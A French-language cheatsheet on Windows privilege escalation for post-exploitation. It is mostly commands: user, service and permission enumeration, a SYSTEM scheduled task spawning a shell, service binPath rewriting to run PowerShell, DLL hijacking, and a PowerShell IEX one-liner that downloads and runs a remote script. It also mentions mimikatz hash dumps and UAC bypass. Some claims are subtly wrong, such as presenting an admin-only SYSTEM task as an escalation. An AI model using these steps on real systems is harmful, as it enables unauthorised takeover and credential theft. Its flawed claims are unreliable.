# 🔐 Windows Privilege Escalation - Cheatsheet Cyber

Ce fichier regroupe les **étapes clés** et **commandes essentielles** pour identifier et exploiter des failles d’élévation de privilèges sur Windows en post-exploitation.

---

## 1️⃣ Enumération de base

whoami /priv  
> Liste les privilèges de l'utilisateur courant

whoami /groups  
> Groupes et privilèges

systeminfo  
> Informations système (version Windows, patchs, etc.)

net user  
> Liste des utilisateurs locaux

net localgroup administrators  
> Membres du groupe Administrateurs

tasklist /v  
> Liste des processus en cours avec détails

sc qc ServiceName  
> Infos sur un service (remplacer ServiceName)

reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall"  
> Liste des logiciels installés

---

## 2️⃣ Recherche de failles liées aux permissions

icacls C:\path\to\folder  
> Vérifie les permissions sur un dossier/fichier

whoami /all  
> Liste des droits et groupes de l’utilisateur

accesschk.exe -uwcqv "Everyone" *  
> Outil Sysinternals pour vérifier permissions (doit être téléchargé)

---

## 3️⃣ Rechercher des configurations vulnérables

schtasks /query /fo LIST /v  
> Liste les tâches planifiées avec détails

reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s /v ObjectName  
> Trouver les services qui tournent avec des comptes privilégiés

netsh firewall show state  
> État du firewall Windows

netstat -ano  
> Connexions réseau actives et PID

---

## 4️⃣ Exploitation de failles classiques

### Exécution de commandes via tâches planifiées

schtasks /create /tn "Elevate" /tr "cmd.exe" /sc once /st 23:59 /ru SYSTEM  
schtasks /run /tn "Elevate"  
> Crée et lance une tâche en SYSTEM pour obtenir un shell

### Services mal configurés

sc config ServiceName binPath= "cmd.exe /c powershell.exe"  
sc start ServiceName  
> Modifier un service vulnérable pour exécuter du code

### DLL Hijacking

Copier une DLL malveillante dans un répertoire chargé par un service vulnérable

---

## 5️⃣ Outils d’automatisation

### WinPEAS

Télécharger depuis GitHub : https://github.com/carlospolop/PEASS-ng/releases  
Exécuter en local ou via PowerShell :

winpeas.exe  
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('URL_de_winPEAS')"  
> Recherche automatique de failles d’élévation

### PowerUp (PowerShell)

Télécharger PowerUp.ps1 et l’exécuter dans une session PowerShell :

Import-Module .\PowerUp.ps1  
Invoke-AllChecks  
> Script pour trouver failles courantes

---

## 6️⃣ Techniques avancées

- Recherche de mots de passe stockés en clair dans le registre ou fichiers  
- Dump de hash via mimikatz  
- Exploitation de vulnérabilités connues spécifiques à la version Windows  
- Analyse des droits NTFS et des ACL  
- Bypass de l’UAC (User Account Control)

---

## 📌 Ressources utiles

- https://github.com/carlospolop/PEASS-ng  
- https://github.com/SecWiki/PowerUp  
- https://github.com/gentilkiwi/mimikatz  
- https://gtfobins.github.io/  
- https://book.hacktricks.xyz/windows-hardening/privilege-escalation  
